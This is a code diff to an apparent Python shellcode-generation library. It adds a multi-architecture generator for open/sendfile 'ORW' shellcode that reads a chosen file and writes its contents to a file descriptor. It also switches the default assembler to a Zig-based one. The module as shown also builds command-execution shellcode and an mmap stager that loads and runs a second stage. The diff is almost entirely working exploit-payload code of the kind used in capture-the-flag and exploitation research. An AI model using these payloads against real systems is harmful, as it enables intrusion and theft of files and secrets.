@@ -3,8 +3,9 @@
 from __future__ import annotations
 
 from dataclasses import dataclass
+from importlib import import_module
 
-from .assembler import LLVMAssembler
+from .assembler import Assembler, ZigAssembler
 from .errors import UnsupportedTargetError
 from .model import MemoryRequirement, Payload, PayloadKind, Permission
 from .target import ABI, Architecture, Target
@@ -45,6 +46,23 @@ class _OrwStack:
     buffer_offset: int
     buffer_size: int
     frame_size: int
+
+
+@dataclass(frozen=True, slots=True)
+class _SendfileStack:
+    data: bytes
+    path_offset: int
+    frame_size: int
+
+
+@dataclass(frozen=True, slots=True)
+class _SendfileSyscalls:
+    open_name: str
+    open_number: int
+    sendfile_name: str
+    sendfile_number: int
+    exit_number: int
+    constants_source: str
 
 
 @dataclass(frozen=True, slots=True)
@@ -101,6 +119,107 @@ def _orw_stack(target: Target, path: str | bytes, max_bytes: int) -> _OrwStack:
         raise ValueError(f"ORW stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
     image.extend(b"\0" * (buffer_offset - len(image)))
     return _OrwStack(bytes(image), path_offset, buffer_offset, max_bytes, frame_size)
+
+
+def _sendfile_stack(target: Target, path: str | bytes) -> _SendfileStack:
+    encoded = path.encode() if isinstance(path, str) else bytes(path)
+    if not encoded:
+        raise ValueError("path cannot be empty")
+    if b"\0" in encoded:
+        raise ValueError("path cannot contain a NUL byte")
+
+    image = bytearray()
+    path_offset = _append_cstring(image, encoded, target.word_size)
+    frame_size = _align(len(image), target.convention.stack_alignment)
+    image.extend(b"\0" * (frame_size - len(image)))
+    if frame_size > _MAX_STACK_IMAGE:
+        raise ValueError(f"sendfile path stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
+    return _SendfileStack(bytes(image), path_offset, frame_size)
+
+
+_PWNTOOLS_CONSTANT_MODULES: dict[Architecture, str] = {
+    Architecture.X86: "i386",
+    Architecture.X86_64: "amd64",
+    Architecture.ARM: "arm",
+    Architecture.THUMB: "thumb",
+    Architecture.ARM64: "aarch64",
+    Architecture.MIPS32: "mips",
+    Architecture.RISCV64: "riscv64",
+    Architecture.POWERPC32: "powerpc",
+    Architecture.POWERPC64: "powerpc64",
+    Architecture.SPARC32: "sparc",
+    Architecture.SPARC64: "sparc64",
+    Architecture.S390X: "s390x",
+}
+
+
+def _sendfile_syscalls(target: Target) -> _SendfileSyscalls:
+    """Resolve syscall numbers, checking pwntools where it has a target table.
+
+    Pwntools 4.x does not ship MIPS N64 or RV32 Linux constant modules.  Those
+    two profiles use the Linux UAPI numbers directly.  A disagreement on a
+    profile which pwntools does publish is an error instead of silently
+    assembling a payload for a different ABI.
+    """
+
+    arch = target.arch
+    if arch is Architecture.X86:
+        values = ("open", 5, "sendfile", 187, 1)
+    elif arch is Architecture.X86_64:
+        values = ("open", 2, "sendfile", 40, 60)
+    elif arch in {Architecture.ARM, Architecture.THUMB}:
+        values = ("open", 5, "sendfile", 187, 1)
+    elif arch is Architecture.ARM64:
+        values = ("openat", 56, "sendfile", 71, 93)
+    elif arch is Architecture.MIPS32:
+        values = ("open", 4005, "sendfile", 4207, 4001)
+    elif arch is Architecture.MIPS64:
+        values = ("open", 5002, "sendfile", 5039, 5058)
+    elif arch is Architecture.RISCV32:
+        # asm-generic exposes __NR3264_sendfile as sendfile64 on ILP32.
+        # With a NULL offset its call shape is exactly the four-register
+        # sendfile operation used here.
+        values = ("openat", 56, "sendfile64", 71, 93)
+    elif arch is Architecture.RISCV64:
+        values = ("openat", 56, "sendfile", 71, 93)
+    elif arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
+        values = ("open", 5, "sendfile", 186, 1)
+    elif arch in {Architecture.SPARC32, Architecture.SPARC64}:
+        values = ("open", 5, "sendfile", 39, 1)
+    elif arch is Architecture.S390X:
+        values = ("open", 5, "sendfile", 187, 1)
+    else:
+        raise UnsupportedTargetError(f"sendfile ORW shellcode is not implemented for {target.name}")
+
+    open_name, open_number, sendfile_name, sendfile_number, exit_number = values
+    module_name = _PWNTOOLS_CONSTANT_MODULES.get(arch)
+    if module_name is None:
+        source = "linux-uapi"
+    else:
+        constants = import_module(f"pwnlib.constants.linux.{module_name}")
+        expected = {
+            f"SYS_{open_name}": open_number,
+            f"SYS_{sendfile_name}": sendfile_number,
+            "SYS_exit": exit_number,
+        }
+        for name, fallback in expected.items():
+            try:
+                observed = int(getattr(constants, name))
+            except AttributeError as exc:
+                raise UnsupportedTargetError(f"pwntools has no {name} constant for {target.name}") from exc
+            if observed != fallback:
+                raise UnsupportedTargetError(
+                    f"pwntools {name}={observed} disagrees with Linux UAPI value {fallback} for {target.name}"
+                )
+        source = f"pwntools:{module_name}"
+    return _SendfileSyscalls(
+        open_name,
+        open_number,
+        sendfile_name,
+        sendfile_number,
+        exit_number,
+        source,
+    )
 
 
 def _qemu_semihosting_stack(target: Target, command: str | bytes) -> _QemuSemihostingStack:
@@ -836,6 +955,400 @@ def _powerpc_orw(target: Target, stack: _OrwStack, output_fd: int) -> list[str]:
     return lines
 
 
+def _x86_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    is_64 = target.arch is Architecture.X86_64
+    sp = "rsp" if is_64 else "esp"
+    accumulator = "rax" if is_64 else "eax"
+    word = "qword" if is_64 else "dword"
+    lines = [f"sub {sp}, {stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend((f"mov {accumulator}, 0x{value:x}", f"mov {word} ptr [{sp} + {offset}], {accumulator}"))
+    if is_64:
+        lines.extend(
+            (
+                f"lea rdi, [rsp + {stack.path_offset}]",
+                "xor esi, esi",
+                "xor edx, edx",
+                f"mov eax, {syscalls.open_number}",
+                "syscall",
+                "test rax, rax",
+                "js .Lsendfile_fail",
+                "mov rsi, rax",
+                f"mov edi, {output_fd}",
+                "xor edx, edx",
+                f"mov r10, 0x{count:x}",
+                f"mov eax, {syscalls.sendfile_number}",
+                "syscall",
+                "test rax, rax",
+                "js .Lsendfile_fail",
+                "xor edi, edi",
+                f"mov eax, {syscalls.exit_number}",
+                "syscall",
+                ".Lsendfile_fail:",
+                "mov edi, 126",
+                f"mov eax, {syscalls.exit_number}",
+                "syscall",
+            )
+        )
+    else:
+        lines.extend(
+            (
+                f"lea ebx, [esp + {stack.path_offset}]",
+                "xor ecx, ecx",
+                "xor edx, edx",
+                f"mov eax, {syscalls.open_number}",
+                "int 0x80",
+                "test eax, eax",
+                "js .Lsendfile_fail",
+                "mov ecx, eax",
+                f"mov ebx, {output_fd}",
+                "xor edx, edx",
+                f"mov esi, 0x{count:x}",
+                f"mov eax, {syscalls.sendfile_number}",
+                "int 0x80",
+                "test eax, eax",
+                "js .Lsendfile_fail",
+                "xor ebx, ebx",
+                f"mov eax, {syscalls.exit_number}",
+                "int 0x80",
+                ".Lsendfile_fail:",
+                "mov ebx, 126",
+                f"mov eax, {syscalls.exit_number}",
+                "int 0x80",
+            )
+        )
+    return lines
+
+
+def _arm_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    suffix = ".w" if target.arch is Architecture.THUMB else ""
+    lines = [f"sub{suffix} sp, sp, #{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(
+            (
+                f"movw r12, #{value & 0xFFFF}",
+                f"movt r12, #{value >> 16}",
+                f"str{suffix} r12, [sp, #{offset}]",
+            )
+        )
+    lines.extend(
+        (
+            f"add{suffix} r0, sp, #{stack.path_offset}",
+            "eor r1, r1, r1",
+            "eor r2, r2, r2",
+            f"movw r7, #{syscalls.open_number}",
+            "svc #0",
+            "cmp r0, #0",
+            "blt .Lsendfile_fail",
+            "mov r4, r0",
+            f"movw r0, #{output_fd}",
+            "mov r1, r4",
+            "eor r2, r2, r2",
+        )
+    )
+    lines.extend(_arm_load("r3", count))
+    lines.extend(
+        (
+            f"movw r7, #{syscalls.sendfile_number}",
+            "svc #0",
+            "cmp r0, #0",
+            "blt .Lsendfile_fail",
+            "eor r0, r0, r0",
+            f"movw r7, #{syscalls.exit_number}",
+            "svc #0",
+            ".Lsendfile_fail:",
+            "movw r0, #126",
+            f"movw r7, #{syscalls.exit_number}",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _aarch64_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    lines = [f"sub sp, sp, #{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_aarch64_load("x9", value))
+        lines.append(f"str x9, [sp, #{offset}]")
+    lines.extend(
+        (
+            "movn x0, #99",
+            f"add x1, sp, #{stack.path_offset}",
+            "mov x2, xzr",
+            "mov x3, xzr",
+            f"mov x8, #{syscalls.open_number}",
+            "svc #0",
+            "cmp x0, #0",
+            "b.lt .Lsendfile_fail",
+            "mov x19, x0",
+            f"mov x0, #{output_fd}",
+            "mov x1, x19",
+            "mov x2, xzr",
+        )
+    )
+    lines.extend(_aarch64_load("x3", count))
+    lines.extend(
+        (
+            f"mov x8, #{syscalls.sendfile_number}",
+            "svc #0",
+            "cmp x0, #0",
+            "b.lt .Lsendfile_fail",
+            "mov x0, xzr",
+            f"mov x8, #{syscalls.exit_number}",
+            "svc #0",
+            ".Lsendfile_fail:",
+            "mov x0, #126",
+            f"mov x8, #{syscalls.exit_number}",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _mips_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    is_64 = target.arch is Architecture.MIPS64
+    add = "daddiu" if is_64 else "addiu"
+    load = "dli" if is_64 else "li"
+    store = "sd" if is_64 else "sw"
+    lines = [f"{add} $sp, $sp, -{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend((f"{load} $t0, 0x{value:x}", f"{store} $t0, {offset}($sp)"))
+    lines.extend(
+        (
+            f"{add} $a0, $sp, {stack.path_offset}",
+            f"{add} $a1, $zero, 0",
+            f"{add} $a2, $zero, 0",
+            f"{load} $v0, {syscalls.open_number}",
+            "syscall",
+            "bnez $a3, .Lsendfile_fail",
+            "nop",
+            "move $s0, $v0",
+            f"{load} $a0, {output_fd}",
+            "move $a1, $s0",
+            f"{add} $a2, $zero, 0",
+            f"{load} $a3, {count}",
+            f"{load} $v0, {syscalls.sendfile_number}",
+            "syscall",
+            "bnez $a3, .Lsendfile_fail",
+            "nop",
+            f"{add} $a0, $zero, 0",
+            f"{load} $v0, {syscalls.exit_number}",
+            "syscall",
+            "nop",
+            ".Lsendfile_fail:",
+            f"{add} $a0, $zero, 126",
+            f"{load} $v0, {syscalls.exit_number}",
+            "syscall",
+            "nop",
+        )
+    )
+    return lines
+
+
+def _riscv_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    store = "sd" if target.arch is Architecture.RISCV64 else "sw"
+    lines = [f"addi sp, sp, -{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
+    lines.extend(
+        (
+            "li a0, -100",
+            f"addi a1, sp, {stack.path_offset}",
+            "li a2, 0",
+            "li a3, 0",
+            f"li a7, {syscalls.open_number}",
+            "ecall",
+            "blt a0, zero, .Lsendfile_fail",
+            "mv s0, a0",
+            f"li a0, {output_fd}",
+            "mv a1, s0",
+            "li a2, 0",
+            f"li a3, {count}",
+            f"li a7, {syscalls.sendfile_number}",
+            "ecall",
+            "blt a0, zero, .Lsendfile_fail",
+            "li a0, 0",
+            f"li a7, {syscalls.exit_number}",
+            "ecall",
+            ".Lsendfile_fail:",
+            "li a0, 126",
+            f"li a7, {syscalls.exit_number}",
+            "ecall",
+        )
+    )
+    return lines
+
+
+def _sparc_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    bias = _sparc_stack_bias(target)
+    trap = _sparc_trap(target)
+    store = "stx" if target.arch is Architecture.SPARC64 else "st"
+    lines = [f"sub %sp, {stack.frame_size}, %sp"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_sparc_load_word(target, "%l0", value))
+        lines.append(f"{store} %l0, [%sp + {bias + offset}]")
+    lines.extend(
+        (
+            f"add %sp, {bias + stack.path_offset}, %o0",
+            "clr %o1",
+            "clr %o2",
+            f"mov {syscalls.open_number}, %g1",
+            f"ta {trap}",
+            "bcs .Lsendfile_fail",
+            "nop",
+            "mov %o0, %l2",
+        )
+    )
+    lines.extend(_sparc_load_word(target, "%o0", output_fd))
+    lines.extend(
+        (
+            "mov %l2, %o1",
+            "clr %o2",
+        )
+    )
+    lines.extend(_sparc_load_word(target, "%o3", count))
+    lines.extend(
+        (
+            f"mov {syscalls.sendfile_number}, %g1",
+            f"ta {trap}",
+            "bcs .Lsendfile_fail",
+            "nop",
+            "clr %o0",
+            f"mov {syscalls.exit_number}, %g1",
+            f"ta {trap}",
+            ".Lsendfile_fail:",
+            "mov 126, %o0",
+            f"mov {syscalls.exit_number}, %g1",
+            f"ta {trap}",
+        )
+    )
+    return lines
+
+
+def _s390_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    lines = [f"lay %r15, -{stack.frame_size}(%r15)"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_s390_load_word("%r0", value))
+        lines.append(f"stg %r0, {offset}(%r15)")
+    lines.extend(
+        (
+            f"la %r2, {stack.path_offset}(%r15)",
+            "lghi %r3, 0",
+            "lghi %r4, 0",
+            f"lghi %r1, {syscalls.open_number}",
+            "svc 0",
+            "ltgr %r2, %r2",
+            "jl .Lsendfile_fail",
+            "lgr %r8, %r2",
+            f"llilf %r2, {output_fd}",
+            "lgr %r3, %r8",
+            "lghi %r4, 0",
+        )
+    )
+    lines.extend(_s390_load_word("%r5", count))
+    lines.extend(
+        (
+            f"lghi %r1, {syscalls.sendfile_number}",
+            "svc 0",
+            "ltgr %r2, %r2",
+            "jl .Lsendfile_fail",
+            "lghi %r2, 0",
+            f"lghi %r1, {syscalls.exit_number}",
+            "svc 0",
+            ".Lsendfile_fail:",
+            "lghi %r2, 126",
+            f"lghi %r1, {syscalls.exit_number}",
+            "svc 0",
+        )
+    )
+    return lines
+
+
+def _powerpc_sendfile_orw(
+    target: Target,
+    stack: _SendfileStack,
+    output_fd: int,
+    count: int,
+    syscalls: _SendfileSyscalls,
+) -> list[str]:
+    store = "std" if target.arch is Architecture.POWERPC64 else "stw"
+    lines = [f"addi 1, 1, -{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_powerpc_load_word(target, 9, value))
+        lines.append(f"{store} 9, {offset}(1)")
+    lines.extend(
+        (
+            f"addi 3, 1, {stack.path_offset}",
+            "li 4, 0",
+            "li 5, 0",
+            f"li 0, {syscalls.open_number}",
+            "sc",
+            "bso .Lsendfile_fail",
+            "mr 14, 3",
+        )
+    )
+    lines.extend(_powerpc_load_word(target, 3, output_fd))
+    lines.extend(("mr 4, 14", "li 5, 0"))
+    lines.extend(_powerpc_load_word(target, 6, count))
+    lines.extend(
+        (
+            f"li 0, {syscalls.sendfile_number}",
+            "sc",
+            "bso .Lsendfile_fail",
+            "li 3, 0",
+            f"li 0, {syscalls.exit_number}",
+            "sc",
+            ".Lsendfile_fail:",
+            "li 3, 126",
+            f"li 0, {syscalls.exit_number}",
+            "sc",
+        )
+    )
+    return lines
+
+
 def exit_source(status: int, target: Target) -> str:
     """Lower a Linux ``exit(status)`` shellcode stub."""
 
@@ -870,11 +1383,11 @@ def exit_source(status: int, target: Target) -> str:
     return "\n".join(lines) + "\n"
 
 
-def exit_shellcode(status: int, target: Target, *, assembler: LLVMAssembler | None = None) -> Payload:
+def exit_shellcode(status: int, target: Target, *, assembler: Assembler | None = None) -> Payload:
     """Build a minimal target-native Linux exit payload."""
 
     source = exit_source(status, target)
-    data = (assembler or LLVMAssembler()).assemble(source, target)
+    data = (assembler or ZigAssembler()).assemble(source, target)
     return Payload(
         data=data,
         target=target,
@@ -1007,7 +1520,7 @@ def qemu_semihosting_command_shellcode(
     command: str | bytes,
     target: Target,
     *,
-    assembler: LLVMAssembler | None = None,
+    assembler: Assembler | None = None,
 ) -> Payload:
     """Build shellcode that runs a command on the QEMU user-mode host.
 
@@ -1017,7 +1530,7 @@ def qemu_semihosting_command_shellcode(
     """
 
     source, stack_size = qemu_semihosting_command_source(command, target)
-    data = (assembler or LLVMAssembler()).assemble(source, target)
+    data = (assembler or ZigAssembler()).assemble(source, target)
     riscv_signature = target.arch in {Architecture.RISCV32, Architecture.RISCV64}
     code_alignment = 16 if riscv_signature else _instruction_alignment(target)
     return Payload(
@@ -1620,12 +2133,12 @@ def mmap_stager(
     *,
     input_fd: int = 0,
     page_size: int = 0x1000,
-    assembler: LLVMAssembler | None = None,
+    assembler: Assembler | None = None,
 ) -> Payload:
     """Build a loader that allocates, reads, finalizes, and runs a second stage."""
 
     source, map_size = mmap_stager_source(size, target, input_fd=input_fd, page_size=page_size)
-    data = (assembler or LLVMAssembler()).assemble(source, target)
+    data = (assembler or ZigAssembler()).assemble(source, target)
     return Payload(
         data=data,
         target=target,
@@ -1691,12 +2204,12 @@ def command_shellcode(
     command: str | bytes,
     target: Target,
     *,
-    assembler: LLVMAssembler | None = None,
+    assembler: Assembler | None = None,
 ) -> Payload:
     """Build position-independent command shellcode for a fully resolved target."""
 
     source, stack_size = command_source(command, target)
-    data = (assembler or LLVMAssembler()).assemble(source, target)
+    data = (assembler or ZigAssembler()).assemble(source, target)
     needs_cache_sync = _requires_instruction_cache_sync(target)
     return Payload(
         data=data,
@@ -1768,12 +2281,12 @@ def orw_shellcode(
     *,
     max_bytes: int = 0x400,
     output_fd: int = 1,
-    assembler: LLVMAssembler | None = None,
+    assembler: Assembler | None = None,
 ) -> Payload:
     """Build position-independent shellcode that copies one file to an fd."""
 
     source, stack_size = orw_source(path, target, max_bytes=max_bytes, output_fd=output_fd)
-    data = (assembler or LLVMAssembler()).assemble(source, target)
+    data = (assembler or ZigAssembler()).assemble(source, target)
     return Payload(
         data=data,
         target=target,
@@ -1805,6 +2318,97 @@ def orw_shellcode(
     )
 
 
+def sendfile_orw_source(
+    path: str | bytes,
+    target: Target,
+    *,
+    count: int = 0x400,
+    output_fd: int = 1,
+) -> tuple[str, int]:
+    """Lower ``open``/``openat`` plus ``sendfile`` without a read buffer."""
+
+    if not 0 <= output_fd <= 0xFFFF:
+        raise ValueError("output_fd must be in the range 0..65535")
+    if count <= 0:
+        raise ValueError("count must be positive")
+    if count > target.mask:
+        raise ValueError(f"count does not fit {target.bits}-bit target")
+
+    stack = _sendfile_stack(target, path)
+    syscalls = _sendfile_syscalls(target)
+    lines = _header(target)
+    if target.arch in {Architecture.X86, Architecture.X86_64}:
+        lines.extend(_x86_sendfile_orw(target, stack, output_fd, count, syscalls))
+    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
+        lines.extend(_arm_sendfile_orw(target, stack, output_fd, count, syscalls))
+    elif target.arch is Architecture.ARM64:
+        lines.extend(_aarch64_sendfile_orw(target, stack, output_fd, count, syscalls))
+    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
+        lines.extend(_mips_sendfile_orw(target, stack, output_fd, count, syscalls))
+    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
+        lines.extend(_riscv_sendfile_orw(target, stack, output_fd, count, syscalls))
+    elif target.arch in {Architecture.SPARC32, Architecture.SPARC64}:
+        lines.extend(_sparc_sendfile_orw(target, stack, output_fd, count, syscalls))
+    elif target.arch is Architecture.S390X:
+        lines.extend(_s390_sendfile_orw(target, stack, output_fd, count, syscalls))
+    elif target.arch in {Architecture.POWERPC32, Architecture.POWERPC64}:
+        lines.extend(_powerpc_sendfile_orw(target, stack, output_fd, count, syscalls))
+    else:
+        raise UnsupportedTargetError(f"sendfile ORW shellcode is not implemented for {target.name}")
+    return "\n".join(lines) + "\n", stack.frame_size
+
+
+def sendfile_orw_shellcode(
+    path: str | bytes,
+    target: Target,
+    *,
+    count: int = 0x400,
+    output_fd: int = 1,
+    assembler: Assembler | None = None,
+) -> Payload:
+    """Build shellcode that transfers a file directly to an output fd."""
+
+    source, stack_size = sendfile_orw_source(path, target, count=count, output_fd=output_fd)
+    syscalls = _sendfile_syscalls(target)
+    data = (assembler or ZigAssembler()).assemble(source, target)
+    return Payload(
+        data=data,
+        target=target,
+        kind=PayloadKind.SHELLCODE,
+        description=f"{syscalls.open_name}/sendfile file shellcode",
+        memory=(
+            MemoryRequirement(
+                len(data),
+                Permission.READ | Permission.EXECUTE,
+                "shellcode bytes",
+                alignment=_instruction_alignment(target),
+            ),
+            MemoryRequirement(
+                stack_size,
+                Permission.READ | Permission.WRITE,
+                "temporary sendfile path stack image",
+                alignment=target.convention.stack_alignment,
+            ),
+        ),
+        data_requirement_index=0,
+        metadata={
+            "operation": "open-sendfile",
+            "open_syscall": syscalls.open_name,
+            "open_syscall_number": syscalls.open_number,
+            "sendfile_syscall": syscalls.sendfile_name,
+            "sendfile_syscall_number": syscalls.sendfile_number,
+            "syscall_constants_source": syscalls.constants_source,
+            "count": count,
+            "output_fd": output_fd,
+            "offset_pointer": None,
+            "uses_read_buffer": False,
+            "position_independent": True,
+            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
+            "assembly": source,
+        },
+    )
+
+
 __all__ = [
     "command_shellcode",
     "command_source",
@@ -1816,4 +2420,6 @@ __all__ = [
     "orw_source",
     "qemu_semihosting_command_shellcode",
     "qemu_semihosting_command_source",
+    "sendfile_orw_shellcode",
+    "sendfile_orw_source",
 ]
